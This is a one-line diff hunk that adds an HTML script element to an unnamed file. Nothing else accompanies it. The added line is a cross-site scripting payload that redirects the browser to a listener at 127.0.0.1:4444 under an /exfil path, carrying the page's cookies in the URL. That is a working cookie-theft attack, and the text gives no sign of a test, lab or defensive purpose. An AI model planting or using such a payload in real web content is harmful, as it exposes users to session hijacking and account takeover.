@@ -1,0 +1,1 @@
+<script>document.location='http://127.0.0.1:4444/exfil?cookie='+encodeURIComponent(document.cookie)</script>
